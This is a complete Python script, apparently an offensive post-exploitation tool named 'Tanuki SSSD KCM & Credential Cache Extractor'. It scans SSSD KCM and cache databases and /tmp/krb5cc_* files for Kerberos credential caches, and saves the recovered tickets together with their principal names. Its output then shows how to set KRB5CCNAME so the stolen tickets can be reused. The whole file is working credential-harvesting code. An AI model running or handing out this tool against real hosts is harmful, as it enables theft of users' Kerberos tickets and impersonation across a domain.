#!/usr/bin/env python3
"""Parse SSSD KCM databases (secrets.ldb) and reconstruct standard CCACHE v4 files."""

import argparse
import glob
import json
import os
import struct
import sys
from typing import Any, Dict, List, Optional

EXIT_SUCCESS = 0
EXIT_USAGE_ERROR = 1
EXIT_RESOURCE_MISSING = 3
EXIT_PARSE_FAILURE = 4


def emit_error(
    message: str,
    reason_code: str,
    category: str,
    exit_code: int,
    target: Optional[str] = None,
    details: Optional[str] = None,
    json_output: bool = False,
) -> None:
    if json_output:
        payload: Dict[str, Any] = {
            "status": "ERROR",
            "reason_code": reason_code,
            "category": category,
            "exit_code": exit_code,
            "message": message,
        }
        if target:
            payload["target"] = target
        if details:
            payload["details"] = details
        print(json.dumps(payload, indent=2))
    else:
        prefix = {
            EXIT_RESOURCE_MISSING: "[RESOURCE MISSING]",
            EXIT_PARSE_FAILURE: "[PARSE FAILURE]",
            EXIT_USAGE_ERROR: "[USAGE ERROR]",
        }.get(exit_code, "[ERROR]")
        if message.startswith("Error:") or message.startswith("Error "):
            sys.stderr.write(f"{prefix} {message}\n")
        else:
            sys.stderr.write(f"{prefix} Error: {message}\n")
        if details:
            sys.stderr.write(f"  Details: {details}\n")
    sys.exit(exit_code)


CCACHE_MAGIC_V4 = b"\x05\x04"
MAX_CANDIDATE_SIZE = 65536


def try_parse_default_principal(slice_bytes: bytes) -> Optional[str]:
    """Parse default principal from CCACHE v4 stream following header tags."""
    if len(slice_bytes) < 12:
        return None

    try:
        (_name_type, num_components, realm_len) = struct.unpack(
            ">III", slice_bytes[:12]
        )
    except struct.error:
        return None

    if num_components == 0 or num_components > 16 or realm_len == 0 or realm_len > 256:
        return None

    cursor = 12
    if cursor + realm_len > len(slice_bytes):
        return None

    try:
        realm = slice_bytes[cursor : cursor + realm_len].decode("utf-8")
    except UnicodeDecodeError:
        return None
    cursor += realm_len

    components: List[str] = []
    for _ in range(num_components):
        if cursor + 4 > len(slice_bytes):
            return None
        (comp_len,) = struct.unpack(">I", slice_bytes[cursor : cursor + 4])
        cursor += 4

        if comp_len == 0 or comp_len > 256 or cursor + comp_len > len(slice_bytes):
            return None
        try:
            comp = slice_bytes[cursor : cursor + comp_len].decode("utf-8")
        except UnicodeDecodeError:
            return None
        components.append(comp)
        cursor += comp_len

    return f"{'/'.join(components)}@{realm}"


def scan_for_ccache_blobs(data: bytes) -> List[Dict[str, Any]]:
    """Scan raw binary data for valid CCACHE v4 streams."""
    results: List[Dict[str, Any]] = []
    offset = 0
    while offset + 4 <= len(data):
        pos = data.find(CCACHE_MAGIC_V4, offset)
        if pos == -1:
            break
        if pos + 4 <= len(data):
            try:
                (header_len,) = struct.unpack(">H", data[pos + 2 : pos + 4])
                if pos + 4 + header_len <= len(data):
                    end = min(pos + MAX_CANDIDATE_SIZE, len(data))
                    blob = data[pos:end]
                    principal = try_parse_default_principal(
                        data[pos + 4 + header_len : end]
                    )
                    results.append(
                        {
                            "offset": pos,
                            "header_len": header_len,
                            "payload_size": len(blob),
                            "default_principal": principal,
                            "data": blob,
                        }
                    )
            except struct.error:
                pass
        offset = pos + 2
    return results


def save_recovered_ticket(out_path: str, data: bytes) -> None:
    """Save ticket bytes with restricted file permissions (0600) when supported."""
    with open(out_path, "wb") as f:
        f.write(data)
    if hasattr(os, "chmod"):
        try:
            os.chmod(out_path, 0o600)
        except OSError:
            pass


def triage_local_caches(out_dir: str, json_mode: bool = False) -> None:
    os.makedirs(out_dir, exist_ok=True)
    all_blobs: List[Dict[str, Any]] = []
    discovered_files: List[str] = []

    secrets_paths = [
        "/var/lib/sss/secrets/secrets.ldb",
        "/var/lib/sss/db/cache_*.ldb",
    ]

    for pattern in secrets_paths:
        for path in glob.glob(pattern):
            if not os.path.isfile(path):
                continue
            try:
                with open(path, "rb") as f:
                    content = f.read()
                blobs = scan_for_ccache_blobs(content)
                for idx, b in enumerate(blobs, 1):
                    base_name = os.path.splitext(os.path.basename(path))[0]
                    dest = os.path.join(out_dir, f"{base_name}_recovered_{idx}.ccache")
                    save_recovered_ticket(dest, b["data"])
                    discovered_files.append(dest)
                all_blobs.extend(blobs)
            except PermissionError:
                if not json_mode:
                    print(f"  [-] Access denied to {path} (run with appropriate read rights)")
            except Exception as e:
                if not json_mode:
                    print(f"  [-] Error parsing {path}: {e}")

    if json_mode:
        json_output = [
            {
                "offset": b["offset"],
                "header_len": b["header_len"],
                "payload_size": b["payload_size"],
                "default_principal": b["default_principal"],
            }
            for b in all_blobs
        ]
        print(json.dumps(json_output, indent=2))
        return

    print("[*] Phase 1: Scanning SSSD KCM database stores...")
    if not discovered_files:
        print("  [-] No accessible or unencrypted KCM database stores found.")
    else:
        for dest in discovered_files:
            print(f"  [+] Recovered KCM ticket blob -> {dest}")

    print("\n[*] Phase 2: Scanning traditional file-based credential caches...")
    tmp_ccaches = glob.glob("/tmp/krb5cc_*")
    for cc in tmp_ccaches:
        print(f"  [+] Discovered active file ccache: {cc}")

    if not discovered_files and not tmp_ccaches:
        print("  [-] No unencrypted ccache blobs discovered in evaluated paths.")
    elif discovered_files:
        print(
            f"\n[+] Set environment to utilize recovered ticket:\n    $ export KRB5CCNAME={out_dir}/<ticket>.ccache"
        )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Tanuki SSSD KCM & Credential Cache Extractor"
    )
    parser.add_argument(
        "-f", "--file", help="Specific LDB database file to extract from"
    )
    parser.add_argument(
        "-o",
        "--out",
        default="./extracted_ccache",
        help="Directory to store recovered .ccache files",
    )
    parser.add_argument(
        "--json", action="store_true", help="Output discovered streams in JSON format"
    )
    args = parser.parse_args()

    if args.file:
        if not os.path.exists(args.file):
            emit_error(
                f"File not found: {args.file}",
                reason_code="MISSING_RESOURCE",
                category="RESOURCE_MISSING",
                exit_code=EXIT_RESOURCE_MISSING,
                target=args.file,
                json_output=args.json,
            )
        os.makedirs(args.out, exist_ok=True)
        try:
            with open(args.file, "rb") as f:
                data = f.read()
        except Exception as exc:
            emit_error(
                f"Error reading database '{args.file}': {exc}",
                reason_code="CORRUPT_DATA",
                category="PARSE_FAILURE",
                exit_code=EXIT_PARSE_FAILURE,
                target=args.file,
                details=str(exc),
                json_output=args.json,
            )
        blobs = scan_for_ccache_blobs(data)

        if args.json:
            json_output = [
                {
                    "offset": b["offset"],
                    "header_len": b["header_len"],
                    "payload_size": b["payload_size"],
                    "default_principal": b["default_principal"],
                }
                for b in blobs
            ]
            print(json.dumps(json_output, indent=2))
            return

        print(f"[*] Found {len(blobs)} candidate ccache streams in {args.file}")
        for idx, b in enumerate(blobs, 1):
            out_path = os.path.join(args.out, f"ticket_{idx}.ccache")
            save_recovered_ticket(out_path, b["data"])
            p_desc = f" ({b['default_principal']})" if b["default_principal"] else ""
            print(f"    -> Saved {out_path}{p_desc}")
    else:
        triage_local_caches(args.out, json_mode=args.json)


if __name__ == "__main__":
    main()
